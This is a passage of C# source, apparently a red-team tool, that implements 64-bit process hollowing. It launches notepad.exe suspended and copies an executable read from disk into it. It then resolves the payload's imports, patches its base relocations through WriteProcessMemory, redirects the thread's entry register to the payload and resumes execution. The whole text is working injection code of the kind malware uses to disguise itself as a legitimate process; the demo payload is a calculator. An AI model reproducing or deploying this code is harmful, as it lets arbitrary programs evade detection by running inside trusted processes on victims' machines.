                        Console.WriteLine(GetLastError());
                        int errorcode = GetLastError();

                        IntPtr originalfirstthunk = baseaddress + (int)firstimport.OriginalFirstThunk;

                        IntPtr firstthunkptr = baseaddress + (int)firstimport.FirstThunk;

                        IntPtr remotefirstthunk = remotebaseaddress + (int)firstimport.FirstThunk;

                        //IMAGE_THUNK_DATA64 firstthunk = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(firstthunkptr, typeof(IMAGE_THUNK_DATA64));
                        IMAGE_THUNK_DATA64 thunk1 = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(originalfirstthunk, typeof(IMAGE_THUNK_DATA64));

                        while (thunk1.Function != 0)
                        {
                            IntPtr name1 = baseaddress + (int)thunk1.Function;

                            string functionname = Marshal.PtrToStringAnsi(name1 + 2);
                            Console.WriteLine(functionname);

                            if (errorcode == 0)
                            {
                                IntPtr functionaddress = GetProcAddress(dllhandle, functionname);
                                if (GetLastError() == 0)
                                {
                                    handles.Add(dllhandle);
                                    Console.WriteLine("Function address: {0}", functionaddress.ToString("X"));

                                    Marshal.WriteInt64(firstthunkptr, functionaddress.ToInt64());

                                    byteswritten = 0;
                                    byte[] functionvalue = BitConverter.GetBytes(functionaddress.ToInt64());
                                    WriteProcessMemory(prochandle,
                                        remotefirstthunk,
                                        functionvalue,
                                        functionvalue.Length,
                                        ref byteswritten
                                        );

                                }
                            }
                            originalfirstthunk += Marshal.SizeOf(typeof(IMAGE_THUNK_DATA64));
                            thunk1 = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(originalfirstthunk, typeof(IMAGE_THUNK_DATA64));

                        }
                        firstthunkptr += 4;
                        remotefirstthunk += 4;

                        importptr += Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR));
                        firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(importptr, typeof(IMAGE_IMPORT_DESCRIPTOR));

                    }
                }
                #endregion



                #region fixing base relocations

                ulong delta = ((ulong)remotebaseaddress.ToInt64()) - ntheader.OptionalHeader.ImageBase;

                Console.WriteLine("Expected ImageBase: {0}", ntheader.OptionalHeader.ImageBase.ToString("X"));
                Console.WriteLine("Loaded ImageBase: {0}", baseaddress.ToString("X"));
                Console.WriteLine("Delta: {0}", delta.ToString("X"));

                IntPtr firstreloc = baseaddress + (int)ntheader.OptionalHeader.BaseRelocationTable.VirtualAddress;
                uint allrelocsize = ntheader.OptionalHeader.BaseRelocationTable.Size;

                IMAGE_BASE_RELOCATION reloc1 = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(firstreloc, typeof(IMAGE_BASE_RELOCATION));

                while (reloc1.pagerva != 0)
                {

                    Console.WriteLine("RVA: {0}", reloc1.pagerva.ToString("X"));
                    Console.WriteLine("size: {0}", reloc1.size.ToString("X"));

                    int entries = ((int)reloc1.size - 8) / 2;

                    Console.WriteLine("Number of entries: {0}", entries.ToString("X"));

                    for (int i = 0; i < entries; i++)
                    {
                        short offset = Marshal.ReadInt16((firstreloc + 8) + (i * 2));

                        if (offset.ToString("X")[0] == 'A')
                        {
                            // IMAGE_REL_BASED_DIR64 10

                            string offset2 = offset.ToString("X").Split('A')[1];

                            Console.WriteLine("Offset: {0}", offset2);

                            byte[] byteoffset2 = Encoding.ASCII.GetBytes(offset2);

                            long temp = Convert.ToInt64(offset2, 16);

                            long fullrva = reloc1.pagerva + temp;
                            Console.WriteLine("Full  RVA: {0}", fullrva.ToString("X"));

                            long value = Marshal.ReadInt64((IntPtr)(baseaddress.ToInt64() + fullrva));
                            Console.WriteLine("TO BE RELOCATED VALUE: {0}", value.ToString("X"));

                            ulong updatedvalue = (ulong)value + delta;
                            Console.WriteLine("updated value: {0}", updatedvalue.ToString("X"));
                            Marshal.WriteInt64((IntPtr)(baseaddress.ToInt64() + fullrva), (long)updatedvalue);

                            byte[] latestvalue = BitConverter.GetBytes(updatedvalue);

                            byteswritten = 0;
                            WriteProcessMemory(prochandle, (IntPtr)(remotebaseaddress.ToInt64() + fullrva), latestvalue, latestvalue.Length, ref byteswritten);
                        }

                    }

                    firstreloc += (int)reloc1.size;
                    reloc1 = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(firstreloc, typeof(IMAGE_BASE_RELOCATION));

                }

                #endregion




                /*uint threadid = 0;
                IntPtr threadhandle = CreateRemoteThread(
                    prochandle,
                    IntPtr.Zero,
                   (uint)ntheader.OptionalHeader.SizeOfStackCommit,
                    remotebaseaddress + (int)ntheader.OptionalHeader.AddressOfEntryPoint,
                    IntPtr.Zero,
                    0,
                    ref threadid
                    );
                Console.WriteLine("last error: {0}", GetLastError());
                Console.WriteLine("Thread ID: {0}", threadid);*/


                CONTEXT64 ctx = new CONTEXT64();
                ctx.ContextFlags = CONTEXT_FLAGS.CONTEXT_INTEGER;
                GetThreadContext(threadhandle, ref ctx);

                Console.WriteLine(ctx.Rcx.ToString("X"));


                ctx.Rcx = (ulong) (remotebaseaddress.ToInt64() + (int)ntheader.OptionalHeader.AddressOfEntryPoint);

                SetThreadContext(threadhandle,ref ctx);

                foreach (var i in handles)
                {
                    FreeLibrary(i);
                }


                VirtualFree(baseaddress, 0, 0x00008000);

                //p.Kill();

            }
            catch { }

        }


        static void Main(string[] args)
        {

            byte[] rawfile = File.ReadAllBytes(@"D:\red teaming tools\calc2.exe");


            StartupInfo s = new StartupInfo();
            // 0x00000004 create_suspended
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            CreateProcessW(
                @"C:\Windows\notepad.exe",
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref s,
               out pi
                );
            //Console.WriteLine(GetLastError());

           
            //PROCESS_INFORMATION pi = (PROCESS_INFORMATION)Marshal.PtrToStructure(pinfo, typeof(PROCESS_INFORMATION));

            Console.WriteLine("Process id: {0}",pi.processid);
            Console.WriteLine(pi.prochandle);


            /*IntPtr prochandle = OpenProcess(0x000F0000 | 0x00100000 | 0xFFFF,
                false,
                pi.processid);*/

            IntPtr prochandle = pi.prochandle;

            IntPtr remoteimagebase = GetProcessImageBase(prochandle);
            Console.WriteLine(remoteimagebase.ToString("X"));

            ProcessHollow64(prochandle, rawfile, remoteimagebase,pi.threadhandle);

            

            ResumeThread(pi.threadhandle);
                
            Console.ReadKey();
            
        }
    }
}
